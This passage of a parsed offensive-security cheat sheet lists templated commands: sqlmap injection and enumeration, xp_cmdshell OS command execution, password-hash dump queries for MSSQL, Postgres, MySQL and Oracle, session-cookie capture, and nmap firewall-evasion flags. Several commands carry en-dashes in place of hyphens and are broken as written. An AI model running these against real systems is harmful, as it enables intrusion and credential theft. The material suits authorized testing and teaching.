      "content": "javascript:atob(\"<BASE64>\")",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Base64 -> ASCII",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "javascript:encodeURI(\"<ASCII_STRING>\")",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "ASCII -> URI",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "javascript:decodeURI(\"<ENCODED_URI>\")",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "URI -> ASCII",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Wget Capture Session Token",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "wget –q –-save-cookies=<OUTPUT_PATH> –-keep-session-cookies –-post-data=\"username:<USERNAME>&password=<PASSWORD>&Login=Login\" <LOGIN_URL>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Curl",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "curl -I -X HEAD -A \"Mozilla/5.0 (compatible; MSIE 7.01; Windows NT 5.0)\" <URL>",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Grab headers and spoof user agent",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "curl -u <USERNAME>:<PASSWORD> -o <OUTPUT_FILE> <URL>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Scrape site after login",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "curl ftp://<USERNAME>:<PASSWORD>@<URL>/<DIRECTORY>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "FTP",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "curl http://<URL>/<FILE_PATH>[1-10].txt",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Sequential lookup",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Automated Web Screenshots (WitnessMe)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "WitnessMe is a tool that takes screenshots of webpages using Pyppeteer.",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "apt-get update",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Update packages",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "apt-get install docker.io",
      "level": 0,
      "metadata": {
        "file_paths": [
          "docker.io"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Install Docker",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "docker pull byt3bl33d3r/witnessme",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Installation",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "docker images",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Get image ID",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "docker run -it --entrypoint=/bin/sh -v $(pwd):/transfer <IMAGE_ID>",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Run docker container mounting /transfer to the current directory on the host machine",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "witnessme screenshot <IP_CIDR> -p <PORT>,<PORT>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Run and execute scan",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "cd <FILE_PATH>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "cd into created scan folder",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "cp *.png /transfer/",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Copy screenshotted files back to host machine current working directory",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "More info at: https://github.com/byt3bl33d3r/WitnessMe",
      "level": 0,
      "metadata": {
        "urls": [
          "https://github.com/byt3bl33d3r/WitnessMe"
        ],
        "file_paths": [
          "//github.com"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "SQLMap",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "sqlmap.py –u \"http://<URL>?id=1&str=val\"",
      "level": 0,
      "metadata": {
        "file_paths": [
          "sqlmap.py"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "GET request",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "sqlmap.py –u \"http://<URL>\" –-data=\"id=1&str=val\"",
      "level": 0,
      "metadata": {
        "file_paths": [
          "sqlmap.py"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "POST request",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "sqlmap.py –u \"http://<URL>\" –-data=\"id=1&str=val\" –p \"id\"",
      "level": 0,
      "metadata": {
        "file_paths": [
          "sqlmap.py"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "–b –-dbms=\"<mssql|mysql|oracle|postgres>\"",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "SQL injection against specific parameter with DB type specified",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Login and note cookie value (cookie1=val1, cookie2=val2)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "sqlmap.py –u \"http://<URL>\" –-data=\"id=1&str=val\" –p \"id\"",
      "level": 0,
      "metadata": {
        "file_paths": [
          "sqlmap.py"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "–-cookie=\"cookie1=val1;cookie2=val2\"",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "SQL injection on authenticated site",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "sqlmap.py –u \"http://<URL>\" –-data=\"id=1&str=val\" –p \"id\" –b –-current-db –-current-user",
      "level": 0,
      "metadata": {
        "file_paths": [
          "sqlmap.py"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "SQL injection and collect DB version, name, and user",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "sqlmap.py –u \"http://<URL>\" –-data=\"id=1&str=val\" –p \"id\" --tables –D \"testdb\"",
      "level": 0,
      "metadata": {
        "file_paths": [
          "sqlmap.py"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "SQL injection and get tables of DB=testdb",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "sqlmap.py –u \"http://<URL>\" –-data=\"id=1&str=val\" –p \"id\" --columns –T \"users\"",
      "level": 0,
      "metadata": {
        "file_paths": [
          "sqlmap.py"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "SQL injection and get columns of user table",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Databases",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "MSSQL",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "SELECT @@version",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "DB version",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "EXEC xp_msver",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Detailed version info",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "EXEC master..xp_cmdshell 'net user‘",
      "level": 0,
      "metadata": {
        "file_paths": [
          "master..xp_cmd"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Run OS command",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "SELECT HOST_NAME()",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Hostname & IP",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "SELECT DB_NAME()",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Current DB",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "SELECT name FROM master..sysdatabases;",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "List DBs",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "SELECT user_name()",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Current user",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "SELECT name FROM master..syslogins",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "List users",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "SELECT name FROM master..sysobjects WHERE xtype=’U’;",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "List tables",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "SELECT name FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name=‘mytable’);",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "List columns",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "SELECT TOP 1 TABLE_NAME FROM INFORMATION_SCHEMA.TABLES",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "System table containing info on all tables",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'mytable')",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "List all tables/columns",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "SELECT name, password_hash FROM master.sys.sql_logins",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Password hashes (2005)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "POSTGRES",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "SELECT version();",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "DB version",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "SELECT inet_server_addr()",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Hostname & IP",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "SELECT current_database();",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Current DB",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "SELECT datname FROM pg_database;",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "List DBs",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "SELECT user;",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Current user",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "SELECT username FROM pg_user;",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "List users",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "SELECT username,passwd FROM pg_shadow",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "List password hashes",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "SELECT relname, A.attname FROM pg_class C, pg_namespace N, pg_attribute A, pg_type T WHERE (C.relkind=’r') AND (N.oid=C.relnamespace) AND (A.attrelid=C.oid) AND (A.atttypid=T.oid) AND (A.attnum>0) AND (NOT A.attisdropped) AND (N.nspname ILIKE ‘public’)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "List columns",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "SELECT c.relname FROM pg_catalog.pg_class c LEFT JOIN pg_catalog.pg_namespace n ON n.oid = c.relnamespace WHERE c.relkind IN (‘r’,\") AND n.nspname NOT IN (‘pg_catalog’, ‘pg_toast’) AND pg_catalog.pg_table_is_visible(c.oid)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "List tables",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "MySQL",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "SELECT @@version;",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "DB version",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "SELECT @@hostname;",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Hostname & IP",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "SELECT database();",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Current DB",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "SELECT distinct(db) FROM mysql.db;",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "List DBs",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "SELECT user();",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Current user",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "SELECT user FROM mysql.user;",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "List users",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "SELECT host,user,password FROM mysql.user;",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "List password hashes",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "table_schema != 'mysql' AND table_schema != 'information_schema'",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "List all tables & columns",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Oracle",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "SELECT * FROM v$version;",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "DB version",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "SELECT version FROM v$instance;",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "DB version",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "SELECT instance_name FROM v$instance;",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Current DB",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "SELECT name FROM v$database;",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Current DB",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "SELECT DISTINCT owner FROM all_tables;",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "List DBs",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "SELECT user FROM dual;",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Current user",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "SELECT username FROM all_users ORDER BY username;",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "List users",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "SELECT column_name FROM all_tab_columns;",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "List columns",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "SELECT table_name FROM all_tables;",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "List tables",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "SELECT name, password, astatus FROM sys.user$;",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "List password hashes",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "SELECT DISTINCT grantee FROM dba_sys_privs WHERE ADMIN_OPTION = 'YES';",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "List DBAs",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Tools",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Nmap",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Scan Types",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "-sn",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Ping scan",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "-sS",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Syn scan",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "-sT",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Connect scan",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "-sU",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "UDP scan",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "-sO",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "IP protocol scan",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Scan Options",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "-p <PORT_RANGES>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Ports",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "-T[0-5]",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Speed presets: 0 Slowest, 5 fastest",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "-n",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "No DNS resolution",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "-O",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "OS Detection",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "-A",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Aggressive Scan",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "-sV",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Service/Version detection",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "-Pn",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "No ping nmap scan",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "-6",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "IPv6 Scan",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "--randomize-hosts",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Randomizes target hosts (will not scan each host in sequence)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "--traceroute",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Run traceroute against host",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "--ttl <TTL_VALUE>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Set TTL",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "--script <SCRIPT_NAME>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Execute script against host",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "--script-args <ARGUMENTS>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Set script arguments",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Output/Input Options",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "-oX <FILE_PATH>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Write to XML file",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "-oG <FILE_PATH>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Write to grep file",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "-oA <FILE_PATH>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Save as all 3 formats",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "-iL <FILE_PATH>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Read hosts/IPs from file",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "--excludefile <FILE_PATH>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Excludes hosts in file",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Firewall Evasion",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "-f",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Fragment packets",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "-S <IP_ADDRESS>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Spoof source IP",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "-g <PORT>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Spoof source port",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "-D <IP_ADDRESS>,<IP_ADDRESS>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Scan with decoys",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "--mtu <MTU>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
